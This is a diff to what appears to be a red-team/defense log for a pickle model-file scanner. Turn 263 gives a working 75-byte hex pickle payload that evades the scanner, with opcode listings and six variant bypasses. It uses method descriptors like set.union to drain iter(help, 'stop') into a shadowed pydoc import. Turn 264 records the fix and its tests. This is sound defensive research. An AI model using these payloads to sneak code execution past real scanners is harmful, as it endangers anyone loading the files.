@@ -17031,3 +17031,237 @@ format applied to 1 test file; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3786 passed, 1022 skipped, 21 warnings in 43.17s
 ```
+
+## Turn 263 - Bypass via iterable-consuming method descriptors
+
+Offensive turn after the Turn 262 defense. The next source-level gap is not
+another constructor; it is unbound method descriptors and factory methods that
+consume iterable arguments immediately.
+
+Smallest representative:
+
+```python
+builtins.set.union(set(), iter(builtins.help, "stop"))
+```
+
+During `pickle.loads`, the unbound `set.union` method descriptor consumes its
+second argument as an iterable and returns a normal `set`. The consumed iterator
+calls `builtins.help()`, which reaches `_sitebuiltins._Helper.__call__` and
+imports `pydoc`. With a shadow `pydoc.py` earlier on `sys.path`, that import is
+code execution.
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086275696c74696e738c097365742e756e696f6e93288f680074522e
+```
+
+Payload shape:
+
+```text
+00: PROTO 4
+18: STACK_GLOBAL builtins.iter
+35: STACK_GLOBAL builtins.help
+42: TUPLE2
+43: REDUCE              # iter(help, "stop")
+44: MEMOIZE
+45: POP
+67: STACK_GLOBAL builtins.set.union
+69: EMPTY_SET           # receiver self
+70: BINGET 0            # call iterator
+72: TUPLE
+73: REDUCE              # set.union(set(), call_iterator), drains input
+74: STOP
+```
+
+Scanner proof:
+
+```text
+primary_len 75
+primary_scan clean findings 0 errors ()
+primary_imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('builtins', 'set.union', 67),
+]
+primary_invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'set.union', 2, 73),
+]
+```
+
+Runtime proof:
+
+```text
+primary_runtime_rc 0
+runtime_type set
+runtime_repr {'owned-value'}
+marker_exists True
+marker_text owned-by-set-union
+primary_runtime_stderr
+```
+
+Sibling probes also stayed scanner-clean while executing the same shadow
+`pydoc.py` marker:
+
+```text
+dict.update len 77 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'dict.update', 2, 75),
+  ]
+  runtime_stdout None | True
+
+dict.fromkeys len 91 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'dict.fromkeys', 2, 89),
+  ]
+  runtime_stdout {'owned-key': 'owned-value'} | True
+
+list.extend len 77 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'list.extend', 2, 75),
+  ]
+  runtime_stdout None | True
+
+set.__init__ len 78 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'set.__init__', 2, 76),
+  ]
+  runtime_stdout None | True
+
+collections.deque.extend len 103 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('collections', 'deque', 0, 97),
+    ('collections', 'deque.extend', 2, 101),
+  ]
+  runtime_stdout None | True
+
+array.array.extend len 94 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('array', 'array', 1, 88),
+    ('array', 'array.extend', 2, 92),
+  ]
+  runtime_stdout None | True
+```
+
+Why it bypasses:
+
+- `iter(help, "stop")` is correctly modeled as `StackValue::CallIterator`.
+- Existing defenses model direct constructors, selected builtin consumers, lazy
+  wrappers, and stdlib materializers.
+- The reducer callable here is a dotted method descriptor such as
+  `builtins.set.union`, not `builtins.set`, so the existing constructor and
+  builtin-consumer tables never inspect the iterable argument.
+- The Python call graph can flag `builtins.help()` when invoked, but the native
+  metadata only records the visible method descriptor call and omits the hidden
+  zero-arg `help()` call.
+
+Likely source-level defense:
+
+- Add a finite table for iterable-consuming method descriptors and factory
+  methods, keyed by `(module, name)` plus the argument positions that may drain
+  a `CallIterator`.
+- Builtin candidates from this turn include:
+  `dict.fromkeys`, `dict.update`, `dict.__init__`, `list.extend`,
+  `list.__init__`, `set.union`, `set.update`, `set.__init__`, and related set
+  algebra methods that accept iterable operands.
+- Stdlib candidates include `collections.deque.extend` and
+  `array.array.extend`.
+- Keep the rule local to reducer metadata, reusing already-decoded
+  `StackValue::CallIterator` arguments; no data-flow across packages is needed.
+
+Performance note:
+
+- The representative payload is 75 bytes.
+- Warm scan median over 1000 runs was `0.000053s`, p95 `0.000058s`, and max
+  `0.000272s`.
+
+## Turn 264 - Defense for iterable-consuming method descriptors
+
+Defensive follow-up for Turn 263. The fix adds a reducer-local
+`method_descriptor_iterable_consumed_callable(...)` table that maps exact
+method/factory callables to the positional argument slots that may drain a
+`StackValue::CallIterator`.
+
+The table covers the demonstrated source-level class:
+
+- Builtin factories and mutators:
+  `dict.fromkeys`, `dict.update`, `dict.__init__`, `list.extend`,
+  `list.__init__`, `set.union`, `set.update`, `set.intersection`,
+  `set.__init__`, `bytearray.extend`, and `bytearray.__init__`.
+- Stdlib mutators:
+  `collections.deque.extend`, `collections.deque.extendleft`,
+  `collections.deque.__init__`, and `array.array.extend`.
+
+Regression coverage:
+
+- Added 10 malicious runtime regressions for method/factory descriptors,
+  including the exact `set.union(set(), iter(help, "stop"))` representative.
+- Added a `dict.setdefault({}, iter(help, "stop"))` near-match negative; it
+  keeps the scanner clean and the child-process marker absent because the call
+  iterator is stored as a key instead of consumed.
+
+Post-fix scanner proof for the Turn 263 representative:
+
+```text
+payload_len 75
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('builtins', 'set.union', 67),
+]
+invocations [
+  ('builtins', 'iter', 2, 18, 43),
+  ('builtins', 'set.union', 2, 67, 73),
+  ('builtins', 'help', 0, 35, 73),
+]
+finding DANGEROUS_CALL_GRAPH
+  _sitebuiltins._Helper.__call__ -> builtins.__import__
+```
+
+Runtime proof still executes:
+
+```text
+runtime rc 0
+runtime_type set
+runtime_repr {'owned-value'}
+marker_exists True
+marker_text owned-by-set-union
+runtime stderr
+```
+
+Performance note:
+
+- The defense is an exact `(module, name)` match and a short positional
+  argument scan for set methods with variadic iterable operands.
+- Warm post-fix scan timing over 1000 runs: median `0.000122s`, p95
+  `0.000132s`, max `0.000482s`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted method-descriptor regressions
+11 passed in 0.59s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+82 passed in 2.34s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+120 passed in 4.31s
+
+ruff format/check, mypy
+format clean; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3797 passed, 1022 skipped, 21 warnings in 54.02s
+```
